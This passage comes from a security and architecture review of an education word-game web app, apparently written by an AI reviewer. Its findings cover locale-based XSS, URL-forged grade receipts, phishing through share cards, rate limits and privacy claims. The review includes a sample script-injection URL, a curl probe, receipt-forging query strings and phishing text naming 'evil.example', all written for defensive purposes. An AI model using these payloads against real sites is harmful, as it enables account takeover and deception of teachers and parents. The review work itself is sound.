- `esl-word-games/page.tsx:9` and `first-day-of-school-icebreakers/page.tsx:9` (`revalidate = 86400`)
- None of the three has `generateStaticParams` or `dynamicParams = false`.

**Severity:** Medium (cost, scale).

**Failure scenario:**
1. Each distinct `/<anything>/education/...` URL is rendered on demand and then stored as its own ISR page.
2. Those pages carry a valid canonical, a `follow` robots directive and hreflang to the real pages, so crawlers keep discovering more of them.
3. A bot loop, or simply link-spam pointing at random prefixes, inflates ISR writes and storage. On Vercel these are billed. It also burns render CPU on the same Node process that serves the game.
4. The cost grows with every education landing page you add, and there are roughly 30 now.

**Fix:**
- Add `export const dynamicParams = false` and `generateStaticParams = () => EDUCATION_LOCALES.map(locale => ({ locale }))` on these pages, or do it once in the `[locale]` layout.
- Unknown segments then 404 before rendering.

## 4. "No credit card" trial promise contradicts the trial email
**Where:**
- `for-schools/content.ts:80`, plus the FAQ at `:117`, which is emitted as FAQPage JSON-LD via `page.tsx:65`.
- The same claim appears in he `:208`/`:245`, sv `:272`/`:309`, ja `:336`/`:373`, es `:400`/`:437` and ru `:144`/`:181`.
- The contradicting email is `lib/email/templates/teacherPolarTrialDay10.ts:38`, which tells the teacher "Polar will charge $9/month when the trial ends unless you cancel".

**Severity:** Medium (billing trust, chargebacks).

**Failure scenario:**
1. A school lead reads "Try Teacher Pro free for 14 days, no credit card" in six languages and in Google's FAQ snippet.
2. On day 10 they get an email saying they will be charged.
3. Either the page is false (Polar collected a card) or the email is false (no card exists, so nothing will be charged).
4. In the first case you have a deceptive-trial complaint at the conversion moment. In the second, every converted teacher believes they are paying when they are not. That surfaces as zero revenue, not as an error.

The previous pass flagged the email as "confirm before sending" but never tied it to the explicit public promise.

**Fix:**
- Check `useStartTeacherProTrial` and the Polar checkout config to see whether a payment method is required.
- Change whichever side is wrong. Keep this claim in a single constant that both the email and the page import.

## 5. K-12 privacy and ads promises conflict with what the system collects
**Where:**
- `for-schools/content.ts:86` and `:119`: "no student data to manage". `:89`: "no ads anywhere in the classroom, ever".
- `first-day-of-school-icebreakers/content.ts:10`: `typicalAgeRange: '8-16'`. `:31`: "No sign-up for students".
- `esl-word-games/landing.ts:100`: `'8-99'`.
- `for-schools/page.tsx:116,119`: `data-ph-capture-attribute-*`, which means PostHog autocapture is on the site.

**Severity:** Medium-High (compliance) for a product marketed to under-13s and sold to schools.

**Failure scenario:**
1. A district privacy officer reviews the page, which says no student data, no accounts and no ads.
2. In reality, `app/api/education/classroom/join/route.ts:58-96` creates a Supabase anonymous auth user and a profile for every joining child.
3. Student display names, XP, streaks and per-word accuracy are stored. They reach other clients through `ClassroomLeaderboard` `fullList` and the miss-gap roster (shard 4, #8).
4. Ad components (`InlineBannerAd`) and PostHog exist in the bundle. If either loads on a student play surface, you are tracking or advertising to 8-year-olds while claiming not to.
5. The result is a failed DPA review, a lost deal, or a COPPA exposure. All three hit the $49/teacher school offer, which is your highest-value revenue path.

**Fix:**
- Replace "no student data to manage" with what is true, for example "students join with a code and a display name; no email or password; data is used only for the class".
- Confirm that ads and PostHog are disabled on `/education/live`, the classroom join flow and student pages.
- Keep a one-page data inventory ready for school procurement.

## 6. Unsourced claims about named competitors, published as structured data
**Where:** `for-schools/content.ts:95-100` (the compare table) and `:122` (FAQ, emitted as JSON-LD via `page.tsx:65`). All six locales repeat these claims.

**Severity:** Low-Medium (legal and trust).

**Failure scenario:**
1. The page states as fact that Vocabulary.com has "no meaningful free tier" and gives Kahoot's player limits, with no date or source.
2. Competitors change their free tiers often. Once these claims are stale, they are false comparative advertising about named brands on a commercial page, and the FAQ JSON-LD amplifies them in search.
3. Two related overclaims:
   - `:99` says "Every activity, free", while analytics and reports are Pro-only.
   - `:125` says teachers can "share assignments straight to Google Classroom", while the file's own header (`:18-20`) restricts the claim to Stream-share only.

**Fix:**
- Add an "as of <date>" note with source links, or reduce each row to what LexiClash does and drop the competitor claims.
- Fix `:99` and `:125` in all locales.

## 7. Check the school lead form for the same holes found on the teacher-access form
**Where:** `for-schools/page.tsx:192` (`ForSchoolsPackages`), backed by `schoolLead.ts` (named in `content.ts:17`). I could not see either file.

**Severity:** Unverified. Medium if the pattern repeats.

**Why it's likely:** the teacher-access intake, another public anonymous form on this site, had three problems:
- unescaped `role` and `locale` in the admin email (`teacherAccessAdminNotify.ts:9-16`)
- CSV formula injection in its export (`teacher-access/export/route.ts:22-24`)
- no rate limiting on sibling public routes (shard 4, #7)

**Failure scenario:**
1. The school-lead form is your quote pipeline. It probably has the same shape: an anonymous POST, a notification email to you, and possibly an admin list or export.
2. An attacker could inject a link or HTML into the email you trust most, or spam the form so real school leads get buried.

**Fix:**
- Check `schoolLead.ts` for `escape()` on every interpolated field and for CRLF stripping on the email subject.
- Check for a CSV leading-character guard.
- Add `checkApiRateLimit` plus a honeypot field.

## 8. The Japanese icebreaker word bank can't be played on a hiragana-only dictionary
**Where:** `first-day-of-school-icebreakers/content.ts:838-879`, against `esl-word-games/content.ts:112` and `:707`, which state that Japanese is judged against "hiragana words".

**Severity:** Low (functional, teacher-facing).

**Failure scenario:**
1. A Japanese teacher pastes the suggested lists into a lesson, for example `ビーチ`, `暖かい`, `友達`, `恥ずかしがり屋`, `読書`.
2. These are katakana and kanji words. A hiragana board and dictionary can neither contain nor accept them.
3. The word bank produces zero valid finds, and the first-day activity fails in front of the class.

**Fix:** rewrite the JA groups in hiragana, for example `びーち`→`はま`, `あたたかい` and `ともだち`. Better, run each locale's word bank through the dictionary loader in a test.

---

## Shared root cause and fix order

Findings 1–3 share one fix: validate `locale` once in `app/[locale]/layout.tsx` and set `dynamicParams = false`.

1. **Run the XSS curl check first.** It takes five minutes, and it is the only finding that could compromise accounts.
2. **Then settle the trial wording (finding 4).** It sits directly on the conversion path you're trying to open.

## Shard 44

# Security and architecture review: what the previous pass missed

**Scope.** Most of this slice is static landing copy. I did not repeat anything the previous pass already reported, such as `help/[slug]/page.tsx:32`, `help/page.tsx:21-30`, the "no devices" copy, and hard-coded pricing.

What I found is in two places:
- **Word lists:** the trust boundary and funnel code under `education/lists/*`.
- **Cross-shard issues:** two problems that only show up when you connect findings from different shards. The previous pass saw each piece separately.

That gives 6 findings, not 10. Two of them depend on code outside this slice (`proxy.ts` and the join route). For each I give a quick test, so you can confirm or dismiss it in a few minutes.

---

## 1. An unvalidated `[locale]` segment reaches JSON-LD and the ISR cache. Possible reflected XSS.

**Severity:** Critical if the conditions below hold; otherwise Low (SEO and cache bloat).

**Where:**
- `irregular-verbs-games/page.tsx:19-21` passes the raw `locale` to `landing.ts:19`.
- `landing.ts:19` passes it to `jsonLd.ts:13`, which builds ``url: `${BASE_URL}/${locale}${PAGE_PATH}` `` into a JSON-LD node.
- `indoor-recess-games/page.tsx:9,20-22` does the same: no locale check, plus `revalidate = 86400`.
- **Correct pattern, for comparison:** `help/[slug]/page.tsx:19,25-27` (`generateStaticParams` with `dynamicParams = false`) and `lists/page.tsx:41,55` (`isPageLocale` → `notFound()`).

**Failure scenario:**
1. An attacker sends a link such as `https://www.lexiclash.live/%3C%2Fscript%3E%3Cscript%3E…%3C%2Fscript%3E/education/irregular-verbs-games`.
2. Next decodes the segment, so `locale` becomes `</script><script>…`.
3. That value is written into the Course JSON-LD. If the template's JSON-LD renderer is plain `JSON.stringify` (which does not escape `<`), the `</script>` closes the tag and the attacker's script runs on your origin.
4. supabase-js keeps the session in localStorage by default. The script can read the token, so an admin who clicks the link loses their account.
5. Even if XSS is not possible, every junk locale becomes its own cached ISR page with a self-canonical URL. Scanner and crawler noise grows that cache without bound.

**Why the previous pass missed it:** shards 26, 27, 36 and 37 each wrote "confirm locale is whitelisted" as an aside. None of them could see `proxy.ts` or the layout.

**Quick test:** `curl -s 'https://www.lexiclash.live/zz%3Cb%3E/education/irregular-verbs-games' | grep -o 'zz<b>'`. A 200 response with the literal string means you are exposed.

**Fix (one place, covers every page):**
- In `app/[locale]/layout.tsx`, add `generateStaticParams` for the 6 locales and set `dynamicParams = false`.
- Send every JSON-LD block through a single serializer that escapes `<`, `>`, `&`, U+2028 and U+2029. `serializeJsonLd`, used at `lists/_components/ui.tsx:29`, may already do this, so reuse it.

---

## 2. Classroom joins share one Supabase anonymous sign-in rate limit across all schools

**Severity:** High (live classes fail to join at small scale). This needs verification.

**Where:** `fe-next/app/api/education/classroom/join/route.ts:58-96`. These line numbers come from the previous pass (shard 4, #7); the file is not in this slice.

**Failure scenario:**
1. The route calls `signInAnonymously()` on the server for every logged-out student.
2. Supabase Auth therefore sees your server's egress IP, not the student's IP.
3. Supabase rate-limits anonymous sign-ins per IP. The default is about 30 per hour. Check Dashboard → Auth → Rate Limits.
4. The first class of about 28 students uses up the limit. The next class that hour, at any school, gets 429 errors. Students cannot join while the teacher is standing in front of the room.

Two smaller problems compound this:
- Every guest join creates a new auth user, and anonymous users count toward MAU billing. One class every day creates around 30 new MAUs per lesson.
- The previous pass called this "no rate limit". The real problem is the opposite: a shared limit that you hit almost immediately.

**Fix:**
- **Now:** raise the anonymous sign-in limit in Supabase.
- **Properly:** stop creating Supabase users for classroom guests. Have the join route issue a short-lived signed guest token (HMAC; claims: `guestId`, `classroomId`, `displayName`, `exp`) that the API and socket verify.
- **Alternatively:** reuse an existing anonymous session from a cookie, so a returning student does not create a new user every lesson.
- **Either way:** add your own throttle keyed on join code plus IP.

---

## 3. Teacher-authored lists are published as public, indexed pages with no visible approval gate

**Severity:** High if teacher lists flow into the catalog automatically; Medium otherwise.

**Where:**
- `lists/_views/ListView.tsx:104-107`: the `list.author` byline is rendered when `origin === 'teacher'`.
- `ListView.tsx:51-59` (metadata title), `:76` (`listGraph` built from the list's content) and `:140-151` (words and definitions).
- `_components/ui.tsx:29`: `dangerouslySetInnerHTML`.

**Failure scenario:**
1. A teacher creates a list. The `origin: 'teacher'` branch shows that teacher lists do reach this catalog.
2. **Stored XSS:** if the title or a definition contains `</script>` and `serializeJsonLd` does not escape `<`, you have stored XSS on an indexed page.
3. **Teacher personal data:** even with escaping, the teacher's name, quite possibly `profiles.full_name`, is published and indexed by Google without clear consent. That is a GDPR issue for EU and Israeli teachers.
4. **Student or offensive content:** teachers often build lists such as "our class names". Those are students' names on a public page of a children's product. A list with offensive words would also go out under your brand.

**Fix:**
- Confirm that `serializeJsonLd` escapes as described in #1.
- Only publish lists that have an explicit `is_public` opt-in and admin approval. You already have a curator ratify flow you can reuse.
- Show a display handle the teacher chooses, not their full name.
- Add a takedown path, and have unpublishing remove the page.

---

## 4. "Play with class" treats any session as an approved teacher

**Severity:** Medium (it breaks the highest-intent CTA in the teacher funnel).

**Where:** `lists/_components/ListActions.tsx:43, 52-57` (the `if (!user) return;` check comes first, and the access link is built at `:48`).

**Failure scenario:**
1. The CTA uses `!!user` as its test. Anonymous guests count as `user` (they are created by the join route in #2), and so do ordinary player accounts.
2. That user clicks "Play with class". The code skips the teacher-access step and goes straight to `classroom-game?flow=quick`.
3. `TeacherGate` then redirects them to the access form, and the return path to this list is lost.
4. Signed-out visitors have a related problem: the quick-launch intent is never written. After approval they land on the list page and have to find the CTA again.
5. This is the same root cause as the miss-gap bypass reported earlier (shard 4, #8): there is no shared check for "real, approved teacher".

**Fix:**
- Gate on `useTeacherAccess().status === 'approved' && !user.is_anonymous`.
- Otherwise, send the user to `accessHref`. Call `writeQuickLaunchIntent` before the redirect, so the launch resumes after approval.
- Add one `isApprovedTeacher(user)` helper and use it everywhere.

---

## 5. Quick-launch from the catalog creates a new lesson on every click (no idempotency key)

**Severity:** Medium (data integrity, and clutter in a paying teacher's library).

**Where:** `ListActions.tsx:55`, which writes `{source:'paste', title, language, words}` with no id. It feeds `ClassroomGameLobbyExpressRunner.ts:165-183`, which the previous pass flagged (shard 8, #2) for creating a lesson on every run.

**Failure scenario:**
1. The catalog is built for browsing: a related-lists grid (`ListView.tsx:191`) and grade and topic chips.
2. A teacher tries 6 lists, and retries one launch after a connection error.
3. They end up with 7 or more near-duplicate lessons.
4. Nothing ties a lesson back to its source list, so the duplicates can't be detected or merged later.

**Fix:**
- Add `sourceListId: list.id` to the intent.
- In `ensureLesson`, look up an existing lesson by `(teacher_id, source_list_id)` before creating one, and add a unique index on that pair so the database enforces it.

---

## 6. The catalog has no checks on its data, so one bad list can take down the whole `/education/lists` tree

**Severity:** Low to Medium (the blast radius is large).

**Where:**
- `ui.tsx:122`: `list.words[0].word` throws if a list has no words.
- `ListView.tsx:67`: the non-null assertion `langHubs.find(...)!`.
- `ListView.tsx:141`: `key={w.word}` collides when a word appears twice.

**Failure scenario:**
1. One list has no words. For example, a teacher deleted every word, or the ingest step dropped entries that were only niqqud.
2. `ListCard` is rendered by the language hub, the topic hubs, the hub's featured section and the related grid on sibling lists, so the throw spreads.
3. Many pages return 500 at once, or the build fails at deploy time.

**Fix:**
- Check the catalog's data rules once, inside `getCatalog()`: at least one word, a language hub exists, words are unique.
- Drop invalid lists and log them, rather than letting a page throw.
- Add a unit test that runs this check over the shipped catalog.

---

## The biggest remaining unknown

Across 40+ shards, the previous pass deferred the same question more than 10 times: "the server or RLS must enforce this". Examples are ProGate analytics, the boss picker, the assignment cap, export, the parent handout, web-vitals, and the leaderboard visibility setting.

Nobody has reviewed:
- RLS policies on the classroom and progress tables.
- The Pro checks inside the API routes.
- Polar webhook dedupe by event id.

A focused pass on those three is worth more than another sweep of the UI, because each would turn a "verify" note into either a confirmed revenue leak or a closed issue.

## Shard 45

# Security and architecture review: `education/live`, the miss-gap tool routes, and the education hub SEO pages

The previous pass found two things in this slice: `EduLivePhaseRouter.tsx:42` (`isHost` vs `isTeacher`) and the `useState` side effect at `EduLivePageClient.tsx:36-41`. I don't repeat either. I found six things it missed. The first is the one to act on before a paying teacher's students touch homework.

The common cause: the miss-gap homework system keeps its whole state in the URL. That includes due date, score, on-time flag, turn-in state and teacher-versus-student mode. Every page treats that state as trusted.

---

## 1. Homework due date, score and turn-in state come from the URL and are trusted
**Where:**
- `miss-gap-grade-passback/page.tsx:39-78` and `:80-89`
- `miss-gap-assignment/page.tsx:4-5` and `:42-45`

**Severity:** High if any completion, streak or grade write uses these values. Medium (forgeable receipts) if they are only displayed.

**Failure scenario, receipt forgery (confirmed from the code):**
1. A student opens their turn-in receipt link from Classroom.
2. They change the URL to `?due=2099-01-01&points=100&max=100&onTime=1&postState=RETURNED`.
3. `parseScore` accepts each field:
   - `points` is clamped only to the attacker-supplied `max` (`:59`, `:62-67`).
   - `onTime` is overridden (`:68-69`).
   - `postState` can be set to `RETURNED`, which is a teacher-side state (`:70-76`).
   - `completed: true` is hardcoded (`:51`, `:58`). A bare URL with only `due` renders a "completed" receipt even though no work was done.
4. The student screenshots a LexiClash-branded "100/100, on time, returned" receipt and shows it to a parent or teacher.

**Failure scenario, credit fraud (inferred, because the completion API isn't in this slice):**
1. The assignment page's contract is that on-time completion feeds the class streak (`:5`), and `due` comes from the query.
2. A student who missed the deadline moves `due` forward in the URL and completes the practice.
3. If the completion call sends the client's due date, or the server recomputes "on time" from it, the student gets streak or grade credit they didn't earn.

**Side bugs in the same code:**
- `max=abc` gives `NaN`. `Math.min(NaN, …)` is also `NaN`, so the receipt renders `NaN`.

**Scale problem:**
- The missed-word list travels in the URL. Hebrew and Japanese percent-encode to roughly three times their length.
- Long lists can be cut off by WhatsApp, Classroom or proxy URL limits, and nothing warns when that happens.
- Every open is `force-dynamic` and uncacheable.

**Fix:**
1. Persist each assignment as a row (`id`, `classroom_id`, `due_date`, `missed_words`) when the teacher creates it, and share only `?a=<id>`.
2. Compute on-time status, points and post state on the server from that row and from the student's server-recorded completion.
3. If you must keep stateless links for now, HMAC-sign the parameter set with a server secret and reject the request on a signature mismatch.
4. Either way, never accept `points`, `onTime` or `postState` from the query string.

## 2. Teacher or student mode on the assignment page is decided by the URL
**Where:** `miss-gap-assignment/page.tsx:36-45`, `:109`, `:143-150`

**Severity:** Medium. This is a trust-boundary problem, so verify it.

**Failure scenario:**
1. `teacherMode` comes from `resolveMissGapEntryFromRecord(query, locale)`. The comment describes this as "the one place that decides" the audience.
2. The server page does no auth check.
3. A student edits or removes the parameter that selects student mode and gets the teacher compose card.
4. Whatever that card can do then runs as that student. That may include re-composing the assignment, generating share or grade-passback links, or pushing to Google Classroom.

**Fix:**
- Treat `teacherMode` as a layout hint only.
- Every action on the compose card must go through an API that checks `auth.uid()` owns the classroom, rather than trusting the page it was launched from.
- Better: render teacher mode only when the session user is the classroom's teacher, and otherwise fall back to the student game.

## 3. Parent-facing WhatsApp and OG cards carry text an attacker chose
**Where:**
- `miss-gap-whatsapp/page.tsx:58-88`
- `miss-gap-practice/page.tsx:46-75`
- `miss-gap-assignment/page.tsx:47-83`

**Severity:** Medium. These routes weren't covered by the earlier brag and daily findings, and the audience here is parents of minors.

**Failure scenario:**
1. Anyone builds `/he/education/miss-gap-whatsapp?lesson=…&teacher=…&missed=…`.
2. `lesson` goes into the `<title>` and `og:title` as "Miss-gap practice for parents — {lesson}".
3. `missed` is joined into `og:description`.
4. The whole payload is rendered into the OG image (`:87`).
5. The attacker posts the link in a class parents' WhatsApp group. It unfurls as an official `lexiclash.live` card naming a real teacher, with text such as "account suspended, renew at evil.example".
6. I can't see whether `parseClassGapShareParams` caps lengths or strips URLs, so this may be fully open.

**Fix:**
- The signed or server-stored payload from finding 1 fixes this as well.
- As a stopgap, clamp `lesson` and `teacher` to about 40 characters and each missed word to about 30.
- Cap the missed list at about 20 words.
- Strip control characters and anything that looks like a URL.
- Apply the same rules in the OG image route.

## 4. JSON-LD "safety" depends on a false assumption, and ISR caches any locale
**Where:**
- `education/page.tsx:32`, `:40`, `:49-61`
- `middle-school-word-games/page.tsx:9`, `:15-23`

**Severity:**
- Medium if middleware lets unknown locales through. A crafted URL then gets an XSS page that is cached on your domain.
- Low otherwise. The scale problem below still applies.

**Failure scenario:**
1. The comment at `:49-51` says `JSON.stringify` escapes content for a `<script>` context. It doesn't: `</script>` passes through unchanged.
2. `locale` is a decoded path segment with no `generateStaticParams` or `dynamicParams=false`. It flows into `buildEducation*JsonLd(locale)` and into every `href`.
3. If a request like `/%3C%2Fscript%3E%3Cscript%3E…/education` reaches the page, the `ld+json` block is broken out of.
4. `revalidate = 3600` then serves that HTML from cache to anyone who opens the link.
5. Scale problem: even without XSS, every unknown locale string becomes a new ISR cache entry, so a crawler or attacker can grow the cache without limit.

**Fix (do it once, not per page):**
- Add one `safeJsonLd()` helper (`JSON.stringify(x).replace(/</g, '\\u003c')`) and use it for every `dangerouslySetInnerHTML` JSON-LD.
- In `app/[locale]/layout.tsx`, call `notFound()` for locales outside `SUPPORTED_LOCALES`.
- Export `generateStaticParams` with `dynamicParams = false` on the ISR landings.

## 5. A classroom teacher may get the student "paused" overlay over their own controls
**Where:** `EduLivePageClient.tsx:79`

The same component uses other teacher checks at `:48` and `:97`, and the already-reported one is at `EduLivePhaseRouter.tsx:42`.

**Severity:** Medium. This is inferred, because I can't see the overlay's z-index or pointer handling.

**Failure scenario:**
1. A classroom teacher has `isClassroomHost = true` and `isHost = false`. Line 48 exists precisely because of this case.
2. The teacher taps Pause in `TeacherLiveControls`.
3. Line 79 renders `<GamePausedOverlay isHost={s.isHost} />`, which is `false`, so the teacher sees the student variant ("teacher paused").
4. If that overlay is a full-screen blocker, the Resume button in the teacher strip is covered. The game stays paused in front of the class until the teacher reloads.

**Root cause:** One component decides "is this the teacher?" in four different ways: `s.isHost`, `isTeacher`, `classroomDecisionRef.current.isHost`, and `routerProps.isHost`.

**Fix:**
- Derive a single `role: 'teacher' | 'student'` inside `useMpPageState` and pass that everywhere.
- The immediate patch is `isHost={isTeacher}` at line 79.

## 6. The grade-passback CSP is a no-op
**Where:** `miss-gap-grade-passback/page.tsx:99-101`. The header comment at `:6` says "CSP allows Classroom iframe".

**Severity:** Medium-low. The outcome is one of two failures.

**Failure scenario:**
1. `metadata.other` emits `<meta name="Content-Security-Policy">`. Browsers ignore `name=` CSP.
2. `frame-ancestors` can't be set from a meta tag at all, even with `http-equiv`.
3. Whatever `next.config.mjs` sends is therefore the real policy. Either:
   - (a) the global header denies framing, so the student attachment view is blank inside Google Classroom and the grade-passback feature is broken; or
   - (b) nothing restricts framing, so any site can frame a turn-in receipt.

The previous pass judged this pattern harmless on the `classroom-addon` routes because `next.config` covers them. Nothing shows that `next.config` covers this route.

**Fix:**
- Set `frame-ancestors https://classroom.google.com …` for this path in `next.config.mjs` `headers()` or in middleware.
- Delete the `other` entry so nobody relies on it.
- Load the page inside a Classroom add-on preview to confirm it renders.

---

**Not reported (copy, not security):** the `seoContent.ts` "no ads" descriptions in he, ja, sv, es and ru; the Russian FAQ language list at `:192` omitting Spanish; the duplicate FAQ "cards" sections in the non-English middle-school copy; and the hardcoded `$9` and `$49` offers in `sight-words-practice/jsonLd.ts:24-26`. Earlier shards cover the same class of issue.

## Shard 46

# Security and architecture review: 9 findings the previous pass missed

This pass covers the files in this batch: the friend-challenge pages, the unplugged and Classroom tool routes, the embed widget, the FAQ pages, the 3D showcase and the Russian landing pages.

**Scope limits:**
- I did not see the API routes these pages call: `/api/growth/async-challenge`, the grade-push code, `parseClassGapShareParams`, or the middleware.
- Findings that depend on that code are marked **verify**.

**Already covered by the previous pass, not repeated here:**
- The `brag` and `daily` URL-text injection.
- The `?next=` open redirect.
- The ineffective meta CSP on the `classroom-addon` routes.
- Copy drift across pages.

---

## 1. Grade-passback receipt is built entirely from the URL, and the default is full credit
**`fe-next/app/[locale]/education/unplugged-grade-passback/page.tsx:36-92`, `:94-101`**

**Severity:** High if this score is pushed to Google Classroom or used as the turn-in record. Medium if it is display-only, because teachers will still trust it.

**Failure scenario:**
1. A student gets the attachment link for an unplugged reteach.
2. They open it with no score params. Lines 56-64 return `cleared: wordCount, total: wordCount, completed: true`, which is a full-credit, completed receipt. No play is needed.
3. Or they append `?max=1000&points=1000&onTime=1&postState=TURNED_IN`.
   - `maxPoints` comes from the URL (`:73`).
   - `pointsEarned` is clamped only to that URL-supplied max (`:79`).
   - `onTime` and `postState` are overridden outright (`:82-90`).
4. The teacher, viewing inside Classroom, sees a forged "turned in, on time, full marks" receipt on your domain.

**Also:** the `Content-Security-Policy` at `:112-114` is emitted as `<meta name=…>`, so browsers ignore it. `frame-ancestors` never works from a meta tag anyway. Whether Classroom can frame this route, or whether any site can, is decided only by `next.config.mjs`.

**Fix:**
- Never derive grade state from query params. On finish, have the server mint an attempt record, or an HMAC-signed token over `{assignmentId, studentId, cleared, total, completedAt}`.
- The receipt page should verify that token or look the record up, and render only that.
- If no record exists, the default branch should render "not started", not full credit.
- Set `frame-ancestors https://classroom.google.com` as a real response header for this path.

## 2. Friend-challenge outcome rests on a client-reported, client-configured game (verify)
**`fe-next/app/[locale]/friend-challenge/[id]/FriendChallengeLandingClient.tsx:76-103`, `:254-282`**

**Severity:** Medium. High if wins award XP, coins or ranking.

**Failure scenario:**
1. On accept, the game config is written to `sessionStorage` (`:86-95`): `durationSeconds` and `targetScore`, with **no board seed**.
2. Solo play then runs a fresh random board, so the friend isn't playing the challenger's board. The table is named `async_board_challenges`, so the scores aren't comparable.
3. The friend can edit `durationSeconds` in devtools to play longer. Or they skip play entirely and send `PUT ?phase=challenged` with an arbitrary score body (`putPhase`, `:58-66`).
4. While the status is `accepted`, "Play now" (`:254-282`) can be pressed indefinitely. Unless the server allows only one submit, the friend can replay until they win.

**Related failure-handling bug:** if `fetch` rejects (offline), `setActing(null)` at `:79` and `:107` never runs. Both buttons stay disabled until reload.

**Fix:**
- On accept, the server returns a play ticket: `{seed, duration, startedAt, nonce}`, using the same seed the challenger played.
- `phase=challenged` should accept exactly one submission per ticket, within `startedAt + duration + grace`.
- Re-score the submitted words server-side against the seeded board instead of trusting a score number.
- Wrap `putPhase` in `try/finally`.

## 3. Challenge `message` is a free-text channel that may bypass parental messaging controls (verify)
**`FriendChallengeLandingClient.tsx:158-162`, fed by `friend-challenge/[id]/page.tsx:69`**

**Severity:** High for a product sold to schools, if the minor tiers exist as the parental-controls page implies.

**Failure scenario:**
1. A parent, or the under-13 tier, has `friendMessaging` disabled (see the `account/parental-controls` capabilities).
2. Another user sends that child a friend challenge with `message: "dm me on <app>"`.
3. The landing page renders `row.message` without checking either party's capabilities. The page reads the row with the service-role client, so RLS can't help.

**Fix:**
- At creation, reject `message` unless both parties have `friendMessaging`.
- At render, suppress it when the viewer lacks the capability.
- Simpler option: replace free text with preset taunts. Also cap the length and run the existing moderation over it.

## 4. Unsigned share payloads put attacker text inside Google Classroom
**`education/team-tiles-unplugged/page.tsx:24-41`, `education/unplugged-reteach/page.tsx:24-41`, `unplugged-grade-passback/page.tsx:94-101`**

**Severity:** Medium.

**Failure scenario:**
1. These `force-dynamic` routes build the `<title>` (via `unpluggedTitle`) and the projector body from the `lesson`, `teacher` and `missed` query params.
2. The grade-passback route is described as a Classroom add-on view.
3. Someone crafts `?teacher=Principal Office&lesson=Re-verify your school login at evil.example` and posts it as an attachment, or sends it to a teacher.
4. It renders under `lexiclash.live`, inside the Classroom frame, as official content. React escaping prevents XSS but not phishing.
5. Params are also unbounded and uncached, so huge `missed` lists cost a full server render each time.

**Fix:**
- Apply the signed-payload fix from #1.
- In `parseClassGapShareParams`, cap the length of each field and of the `missed` list.
- Strip URL-like strings.
- Drop `teacher` from the title.

## 5. The EN acquisition landing preloads 328 full-size JPEGs per visitor
**`free-multiplayer-word-game/Showcase3DClient.tsx:31-36`, `:126-145`, `:147-155`**

**Severity:** Medium. This is the design that breaks first at 10x traffic.

**Failure scenario:**
1. Each visit eagerly creates `Image()` objects for 84+80+80+84 = 328 frames (`:128-145`). At a typical 80-150 KB per frame, that's roughly 25-50 MB per page view. CDN egress grows linearly with traffic on your most promoted SEO page, and mobile users on metered data bounce while the loader runs.
2. Reduced-motion users download all 328 frames, but only frame `TOTAL-1` is ever shown (`:147-155`).
3. `setFramesLoaded` fires once per frame (`:127`), which means 328 re-renders of the whole page component during load.

**Fix:**
- Load about 30 frames on mobile and the full set only on desktop.
- Switch to AVIF or WebP at display resolution.
- Load progressively: frame 0 first, the rest on `requestIdleCallback`.
- When reduced motion is on, load only the last frame.
- Throttle the progress state, for example update every 10%.

## 6. Friend-challenge page authorizes by hand on a service-role read, and ignores expiry
**`friend-challenge/[id]/page.tsx:21-36`, `:71`**

**Severity:** Low-medium (defense in depth).

**Failure scenario:**
- **Authorization:** `createAdminClient()` reads the row with `select('*')`, which bypasses RLS. The only thing standing between any logged-in user and every challenge (names, scores, private messages) is the `isChallenger || isChallenged` check at `:32-34`. Any future refactor that drops or loosens that check leaks every challenge.
- **Expiry:** `expires_at` is passed through but never compared. A `pending` challenge whose expiry cron hasn't run yet still shows **Accept**. Whether accepting succeeds then depends on the PUT route checking expiry.

**Fix:**
- Read with the user-scoped server client, under an RLS policy of `challenger_id = auth.uid() OR challenged_id = auth.uid()`. Select only the needed columns.
- Treat `pending && expires_at < now()` as `expired`, both here and in the PUT handler.

## 7. FAQ privacy claims describe controls that may not exist (verify)
**`fe-next/app/[locale]/faq/content.ts:126`, `:131`** (and the matching items in all six locales)

**Severity:** Low-medium (compliance).

**Failure scenario:**
1. The FAQ, which also feeds the FAQPage schema, says users "can opt out of analytics and personalized ads in Settings > Privacy". On the web it names "Google AdMob".
2. If that settings path doesn't exist, you are advertising a GDPR/CCPA consent control you don't provide.
3. That claim sits on a page AdSense reviewers read.

**Fix:**
- Point the copy at the real consent mechanism, such as the CMP banner and `/account/parental-controls`.
- On web, say AdSense.
- Delete the claim if there is no opt-out.

## 8. FAQ page emits two different FAQPage schemas, possibly three
**`faq/layout.tsx:33-45`, `:79-84`, plus `faq/page.tsx:12-28`, `:243-246`, and `GamePageSeoContent` at `:251-256`**

**Severity:** Low (search rich results).

**Failure scenario:**
1. The layout emits `FAQPage#faqpage` from the translation keys `faq.q.*`.
2. The page emits `FAQPage#faq` from `content.ts`, with different question text.
3. `GamePageSeoContent` receives a third `faq` array and likely emits a third schema.
4. Google reports "Duplicate field FAQPage" and drops FAQ rich results for `/faq` in all locales.
5. Separately, the canonical at `:44` and `:72` uses the raw `locale` even though `validLocale` is computed at `:38`.

**Fix:**
- Emit one FAQPage, built from `content.ts`, which is what is visibly rendered.
- Remove the layout schema, and pass `faq={[]}` or disable the schema in `GamePageSeoContent`.
- Use `validLocale` in the canonical.

## 9. ISR pages under `[locale]` mint cache entries for any locale segment (verify middleware)
**`education/spelling-bee-practice/page.tsx:9`, `:15-23`; `erudit-onlayn/page.tsx:6`, `:58`; `filvordy-onlayn/page.tsx:6`**

**Severity:** Low today. It grows with crawl volume.

**Failure scenario:**
1. These pages use `revalidate = 86400` with no `generateStaticParams` and no `notFound()` for unknown locales.
2. If the middleware doesn't reject unknown locales, `/aa/...`, `/ab/...` and so on each render and persist a separate ISR entry.
3. Across the hundreds of ISR marketing routes in this repo, a crawler or a script can grow cache storage and render cost without bound.
4. The previous pass flagged unvalidated locales per page, as canonical or 500 issues, but not this cost amplification.

**Fix:** reject non-`LOCALES` segments once, in middleware with a 404. Also set `dynamicParams = false` with `generateStaticParams` on the static marketing routes.

---

**Checked and fine:**
- **`embed/word-of-the-day/route.ts`:** it validates the locale, HTML-escapes every interpolated value, and sets a deliberate `frame-ancestors *` with no script surface.
- **`error.tsx`:** the chunk-reload guard is bounded at one reload per click.
- **Friend-challenge `PUT`:** it is same-origin JSON, so the CORS preflight blocks cross-site CSRF.